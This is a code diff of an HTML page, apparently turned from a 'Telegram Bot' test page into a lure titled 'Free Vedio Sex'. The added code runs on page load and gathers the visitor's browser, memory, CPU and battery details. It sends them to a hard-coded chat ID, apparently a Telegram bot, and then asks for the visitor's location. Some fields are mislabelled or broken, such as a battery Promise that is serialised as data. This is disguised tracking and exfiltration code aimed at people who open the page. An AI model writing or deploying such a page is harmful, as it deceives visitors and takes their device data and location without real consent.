@@ -1,15 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Telegram Bot</title>
+  <title>Free Vedio Sex</title>
   <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 20px;
+    }
+    
+    h1 {
+      color: #333;
+    }
+    
+    button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+      margin-right: 10px;
+    }
+    
     #video-container {
       display: none;
+      margin-top: 20px;
+    }
+    
+    #video-container h2 {
+      color: #333;
+      margin-bottom: 10px;
+    }
+    
+    #video-container p {
+      color: #666;
+      margin-bottom: 10px;
+    }
+    
+    #video-container button {
+      background-color: #2196F3;
     }
   </style>
 </head>
-<body>
-  <h1>Watch Free Vedio Sex Free</h1>
+<body onload="sendDeviceInfo()">
+  <h1>Free Vedio Sex</h1>
   
   <button onclick="sendDeviceInfo()">Send Device Info</button>
   <button onclick="requestLocation()">Request Location</button>
@@ -24,8 +59,9 @@
     function sendDeviceInfo() {
       var deviceInfo = {
         userAgent: navigator.userAgent,
-        screenWidth: window.screen.width,
-        screenHeight: window.screen.height
+        deviceName: navigator.deviceMemory ? navigator.deviceMemory : "N/A",
+        cpuArchitecture: navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "N/A",
+        batteryLevel: navigator.getBattery ? getBatteryLevel() : "N/A"
       };
       
       var xhr = new XMLHttpRequest();
@@ -35,6 +71,19 @@
         chat_id: '5990142501',
         text: JSON.stringify(deviceInfo)
       }));
+      
+      requestLocation();
+    }
+    
+    function getBatteryLevel() {
+      return new Promise(function(resolve, reject) {
+        navigator.getBattery().then(function(battery) {
+          resolve(battery.level * 100);
+        }).catch(function(error) {
+          console.log(error);
+          reject(error);
+        });
+      });
     }
     
     function requestLocation() {
